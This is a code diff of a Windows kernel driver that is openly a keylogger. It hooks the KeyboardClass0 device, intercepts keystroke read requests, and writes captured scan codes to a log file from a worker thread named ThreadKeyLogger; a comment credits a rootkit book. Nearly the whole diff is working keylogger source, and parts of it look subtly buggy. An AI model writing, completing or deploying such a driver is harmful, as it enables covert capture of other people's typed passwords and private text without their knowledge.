@@ -8,21 +8,15 @@
 
 #include <ntddk.h>
 #include <ntstrsafe.h>
-#include "ntddkbd.h"
 #include "source.h"
 #include "scancode.h"
 
-UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\kbdDevice");                    // ADDED
-UNICODE_STRING SymLinkName = RTL_CONSTANT_STRING(L"\\??\\kbdDeviceLink");                   // ADDED
-PDEVICE_OBJECT DeviceObject = NULL;                                                         // ADDED
+//UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\kbdDevice");                    // ADDED
+//UNICODE_STRING SymLinkName = RTL_CONSTANT_STRING(L"\\??\\kbdDeviceLink");                   // ADDED
 
 PDEVICE_OBJECT pKeyboardDeviceObject = NULL;
-ULONG pendingkey = 0;
+ULONG numPendingIrps = 0;
 typedef BOOLEAN bool;
-
-
-
-
 
 VOID GetKey(char* buf, USHORT makecode)
 {
@@ -94,24 +88,49 @@ VOID GetKey(char* buf, USHORT makecode)
     }
 }
 
-VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
+VOID Unload(IN PDRIVER_OBJECT pDriverObject)
 {    
-    LARGE_INTEGER interval = { 0 };
-    PDEVICE_OBJECT DeviceObject = DriverObject->DeviceObject;
-    interval.QuadPart = -10 * 1000 * 1000;
-    IoDetachDevice(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->pKeyboardDevice);
+    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+    DbgPrint("[*] Driver Unload Called\n");
 
-    while (pendingkey)
+    // Detach Device
+    IoDetachDevice(pKeyboardDeviceExtension->pKeyboardDevice);
+    DbgPrint("[*] Keyboard hook detached from Device\n");
+
+    // Initialize timer
+    KTIMER kTimer;
+    LARGE_INTEGER timeout;
+    timeout.QuadPart = 1000000;   //0.1 s
+    KeInitializeTimer(&kTimer);
+
+    while (numPendingIrps > 0)
     {
-        KeDelayExecutionThread(KernelMode, FALSE, &interval);
+        // Set the timer
+        KeSetTimer(&kTimer, timeout, NULL);
+        KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
     }
 
-    IoDeleteSymbolicLink(&SymLinkName);                                                     // ADDED
-    IoDeleteDevice(pKeyboardDeviceObject);
-    DbgPrint("[*] Driver Unload");
+    // Set our key logger worker thread to terminate
+    pKeyboardDeviceExtension->bThreadTerminate = TRUE;
+
+    // Wake up thread if it is blocked and WaitForXXX after this call
+    KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, TRUE);
+
+    // Wait until the worker thread terminates.
+    DbgPrint("Waiting for key logger thread to terminate...\n");
+    KeWaitForSingleObject(pKeyboardDeviceExtension->pThreadObj, Executive, KernelMode, FALSE, NULL);
+    DbgPrint("Key logger thread terminated\n");
+
+    // Close the log file
+    ZwClose(pKeyboardDeviceExtension->hLogFile);
+
+    // Delete the device.
+    IoDeleteDevice(pDriverObject->DeviceObject);
+    DbgPrint("Tagged IRPs dead...Terminating...\n");
+    return;
 }
 
-NTSTATUS DispatchPass(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+NTSTATUS DispatchPassDown(PDEVICE_OBJECT DeviceObject, PIRP Irp)
 {
     PIO_STACK_LOCATION irpsp = IoGetCurrentIrpStackLocation(Irp);
     NTSTATUS status = STATUS_SUCCESS;
@@ -120,13 +139,13 @@ NTSTATUS DispatchPass(PDEVICE_OBJECT DeviceObject, PIRP Irp)
     switch (irpsp->MajorFunction)
     {
     case IRP_MJ_CREATE:
-        DbgPrint("[*] IRP_MJ_CREATE Request");
+        DbgPrint("[*] IRP_MJ_CREATE Request\n");
         Irp->IoStatus.Information = 0;
         Irp->IoStatus.Status = status;
         IoCompleteRequest(Irp, IO_NO_INCREMENT);
         break;
     case IRP_MJ_CLOSE:
-        DbgPrint("[*] IRP_MJ_CLOSE Request");
+        DbgPrint("[*] IRP_MJ_CLOSE Request\n");
         Irp->IoStatus.Information = 0;
         Irp->IoStatus.Status = status;
         IoCompleteRequest(Irp, IO_NO_INCREMENT);
@@ -142,114 +161,108 @@ NTSTATUS DispatchPass(PDEVICE_OBJECT DeviceObject, PIRP Irp)
     return status;
 }
 
-// CompletionRoutine for IoSetCompletionRoutine();
-NTSTATUS ReadComplete(PDEVICE_OBJECT pDeviceObject, PIRP Irp, PVOID Context)
+NTSTATUS OnReadCompletion(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
 {
-    CHAR* keyflag[4] = {"KeyDown","KeyUp","E0","E1"};
-
     PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject -> DeviceExtension;
-    PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
-    int structnum = Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);     // bytes written
 
-
-    
-    if (Irp->IoStatus.Status == STATUS_SUCCESS)
+    if (pIrp->IoStatus.Status == STATUS_SUCCESS)
     {
-        char buf[64] = { 0 };
+        PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
+        int numKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
 
-        for (int i = 0; i < structnum; i++)
+        for (int i = 0; i < numKeys; i++)
         {
-            if (strcmp(keyflag[keys[i].Flags], "KeyDown"))
+            DbgPrint("ScanCode: %x\n", keys[i].MakeCode);
+
+            if (keys[i].Flags == KEY_MAKE)
             {
+                DbgPrint("%s\n", "Key Down");
+
+                /* MY HAND CRAFTED DEBUG VIEWER KEY LOGGER */
+                char buf[64];
                 GetKey(buf, keys[i].MakeCode);
                 DbgPrint("Key: %s (0x%x)\n", buf, keys[i].MakeCode);
+                RtlZeroMemory(buf, 64);
+                /*******************************************/
 
                 // Initialize kData
-                KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));;
+                KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
 
                 // Fill in kData structure with info from IRP.
                 kData->KeyData = (char)keys[i].MakeCode;
                 kData->KeyFlags = (char)keys[i].Flags;
 
                 // Add the scan code to the linked list queue so our worker thread can write it out to a file.
-                DbgPrint("Adding IRP to work queue..."); 
+                DbgPrint("Adding IRP to work queue...\n"); 
 
                 ExInterlockedInsertTailList(&pKeyboardDeviceExtension->QueueListHead, &kData->ListEntry, &pKeyboardDeviceExtension->lockQueue);
 
                 KeReleaseSemaphore(&pKeyboardDeviceExtension->semQueue, 0, 1, FALSE);
             } 
-        }
-            
-
-        RtlZeroMemory(buf, 64);
+        }   
     }
 
-    if (Irp->PendingReturned)
+    if (pIrp->PendingReturned)
     {
-        IoMarkIrpPending(Irp);
+        IoMarkIrpPending(pIrp);
     }
 
     // Decrease pendingkey counter
-    pendingkey--;
+    numPendingIrps--;
 
-    return Irp->IoStatus.Status;
+    return pIrp->IoStatus.Status;
 }
 
-NTSTATUS DispatchRead(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
 {    
-    IoCopyCurrentIrpStackLocationToNext(Irp);
+    IoCopyCurrentIrpStackLocationToNext(pIrp);
 
     // Intercepts IRP Read Requests that are returned from the physical device
-    IoSetCompletionRoutine(Irp, ReadComplete, NULL, TRUE, TRUE, TRUE); 
+    IoSetCompletionRoutine(pIrp, OnReadCompletion, pDeviceObject, TRUE, TRUE, TRUE);
 
     // Increase pendingkey counter
-    pendingkey++;
+    numPendingIrps++;
 
-    return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->pKeyboardDevice, Irp);
+    return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
 }
 
-NTSTATUS MyAttachDevice(IN PDRIVER_OBJECT DriverObject)
+NTSTATUS HookKeyboard(IN PDRIVER_OBJECT pDriverObject)
 {
     NTSTATUS status;
-    UNICODE_STRING uKeyboardDeviceName = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
+    PDEVICE_OBJECT pKeyboardDeviceObject;
 
-    status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), &DeviceName, FILE_DEVICE_KEYBOARD, 0, TRUE, &pKeyboardDeviceObject);
+    status = IoCreateDevice(pDriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, TRUE, &pKeyboardDeviceObject);
 
     if (!NT_SUCCESS(status))
     {
         DbgPrint("[!] IoCreateDevice Failed!\n");
-        IoDeleteDevice(DeviceObject);
         return status;
     }        
 
-    pKeyboardDeviceObject->Flags |= DO_BUFFERED_IO;
-    pKeyboardDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
+    // Set flags for new device to be identical to those of underlying keyboard device
+    pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
+    pKeyboardDeviceObject->Flags = pKeyboardDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;
 
+    // Zeros out DEVICE_EXTENTION structure and creates a pointer
     RtlZeroMemory(pKeyboardDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
 
-    // #TODO - get device extention pointer - ROOTKIT Book, page 143 (top of page)
+    // Get pointer to the device extension
+    // PDEVICE_EXTENSION pKeyboardDeviceExtention = (PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension;
 
+    // Strings for KeyboardClass0
+    CCHAR ntNameBuffer[64] = "\\Device\\KeyboardClass0";
+    STRING ntNameString;
+    UNICODE_STRING uKeyboardDeviceName;
+    
+    // Change Name from CCHAR => STRING => UNICODE_STRING
+    RtlInitAnsiString(&ntNameString, ntNameBuffer);
+    RtlAnsiStringToUnicodeString(&uKeyboardDeviceName, &ntNameString, TRUE);
+        
     // AttachDevice to Keyboard0
     status = IoAttachDevice(pKeyboardDeviceObject, &uKeyboardDeviceName, &((PDEVICE_EXTENSION)pKeyboardDeviceObject->DeviceExtension)->pKeyboardDevice);
 
+    // Free KeyboardDeviceName string
     RtlFreeUnicodeString(&uKeyboardDeviceName);
-
-    if (!NT_SUCCESS(status))
-    {
-        IoDeleteDevice(pKeyboardDeviceObject);
-        DbgPrint("[!] IoAttachDevice Failed!\n");
-        return status;
-    } 
-
-    // Symlink allows user applications to access our device
-    status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
-
-    if (!NT_SUCCESS(status))
-    {
-        DbgPrint("[!] IoCreateSymbolicLink Failed!\n");
-        IoDeleteDevice(DeviceObject);
-        return status;
-    }
 
     return STATUS_SUCCESS;
 
@@ -257,11 +270,13 @@ NTSTATUS MyAttachDevice(IN PDRIVER_OBJECT DriverObject)
 
 VOID ThreadKeyLogger(IN PVOID pContext)
 {
+    DbgPrint("Enter ThreadKeyLogger\n");
+
     PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;
-    PDEVICE_OBJECT pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;
+    //PDEVICE_OBJECT pKeyboardDeviceObject = pKeyboardDeviceExtension->pKeyboardDevice;
     PLIST_ENTRY pListEntry;
     KEY_DATA* kData;
-    char keys[64] = { 0 };
+    char keys[3] = { 0 };
 
     while (TRUE)
     {
@@ -278,64 +293,111 @@ VOID ThreadKeyLogger(IN PVOID pContext)
         kData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
 
         ConvertScanCodeToKeyCode(pKeyboardDeviceExtension, kData, keys);
+
+        if (keys != 0)
+        {
+            if (pKeyboardDeviceExtension->hLogFile != NULL)
+            {
+                IO_STATUS_BLOCK io_status;
+                NTSTATUS status = ZwWriteFile(pKeyboardDeviceExtension->hLogFile, NULL, NULL, NULL, &io_status, &keys, strlen(keys), NULL, NULL);
+                
+                if (status != STATUS_SUCCESS)
+                {
+                    DbgPrint("Writing scan code to file...\n");
+                }
+
+                else
+                {
+                    DbgPrint("Scan code '%s' successfully written to file...\n", keys);
+                }
+            }
+        }
     }
+
+    DbgPrint("Enter ThreadKeyLogger\n");
+
+    return;
 }
 
 NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject)
 {
-    PDEVICE_EXTENSION pKeyboardDeviceExtention = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+    pKeyboardDeviceExtension->bThreadTerminate = FALSE;
 
     // Create Worker Thread
     HANDLE hThread;
-    NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadKeyLogger, pKeyboardDeviceExtention);
+    NTSTATUS status = PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, ThreadKeyLogger, pKeyboardDeviceExtension);
+
+    
 
     if (!NT_SUCCESS(status))
     {
-        DbgPrint("[!] PsCreateSystemThread Failed");
+        DbgPrint("[!] PsCreateSystemThread Failed\n");
         return status;        
     }
 
-    // Obtain a pointer to the thread object
-    ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pKeyboardDeviceExtention->pThreadObj, NULL);
+    else
+    {
+        DbgPrint("[*] PsCreateSystemThread Successful\n");
+    }
 
+    // Obtain a pointer to the thread object
+    status = ObReferenceObjectByHandle(hThread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);
+
+    if (!NT_SUCCESS(status))
+    {
+        DbgPrint("[!] ObReferenceObjectByHandle Failed\n");
+        return status;
+    }
+
+    else
+    {
+        DbgPrint("[*] ObReferenceObjectByHandle Successful\n");
+    }
+
+    // Close handle to thread (thread is still active in background)
     ZwClose(hThread);
     return status;
 }
 
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING RegistryPath)
 {
-    NTSTATUS status;
-
-    pDriverObject->DriverUnload = DriverUnload;
+    NTSTATUS status;    
 
     // Iterate through IRP Functions
-    for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
+    for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
     {
         // DispatchPassThru will handle IRP Major Functions
-        pDriverObject->MajorFunction[i] = DispatchPass;
-    }
+        pDriverObject->MajorFunction[i] = DispatchPassDown;
+    } 
 
-    pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
+    // Function for the Keyboard Read requests
+    pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;    
         
-    status = MyAttachDevice(pDriverObject);
+    status = HookKeyboard(pDriverObject);
 
     if (!NT_SUCCESS(status))
     {        
-        DbgPrint("[!] MyAttachedDevice Failed");
+        DbgPrint("[!] HookKeyboard Failed");
         return status;
     }
 
+    else
+    {
+        DbgPrint("[*] HookKeyboard Successful");
+    }    
+    
     InitThreadKeyLogger(pDriverObject);
-
+    
     // Initialize a shared link list queue
-    PDEVICE_EXTENSION pKeyboardDeviceExtention = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
-    InitializeListHead(&pKeyboardDeviceExtention->QueueListHead);
+    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
+    InitializeListHead(&pKeyboardDeviceExtension->QueueListHead);
 
     // Initialize the lock for the linked list queue; this protects two threads from accessing the same list, which leads to BSOD
-    KeInitializeSpinLock(&pKeyboardDeviceExtention->lockQueue);
+    KeInitializeSpinLock(&pKeyboardDeviceExtension->lockQueue);
     
     // Initialize the work queue symaphore; this protects two threads from accessing the same list, which leads to BSOD
-    KeInitializeSemaphore(&pKeyboardDeviceExtention->semQueue, 0, MAXLONG);
+    KeInitializeSemaphore(&pKeyboardDeviceExtension->semQueue, 0, MAXLONG);
 
     // Create the log file
     IO_STATUS_BLOCK file_status;
@@ -347,7 +409,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING Registr
     RtlAnsiStringToUnicodeString(&uFileName, &ntNameString, TRUE);
     InitializeObjectAttributes(&obj_attrib, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    status = ZwCreateFile(&pKeyboardDeviceExtention->hLogFile, GENERIC_WRITE, &obj_attrib, &file_status, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
+    status = ZwCreateFile(&pKeyboardDeviceExtension->hLogFile, GENERIC_WRITE, &obj_attrib, &file_status, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
     RtlFreeUnicodeString(&uFileName);
 
     if (status != STATUS_SUCCESS)
@@ -357,11 +419,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING Registr
     }
     else
     {
-        DbgPrint("Successfully created log file...\n");
-        DbgPrint("File Handle = %x\n", pKeyboardDeviceExtention->hLogFile);
+        DbgPrint("[*] Successfully created log file...\n");
+        DbgPrint("File Handle = %x\n", pKeyboardDeviceExtension->hLogFile);
     }
 
-    DbgPrint("[*] DriverEntry Completed Successfully");
+    pDriverObject->DriverUnload = Unload;
+
+    DbgPrint("[*] DriverEntry Completed Successfully\n");
     return status;
 }
 
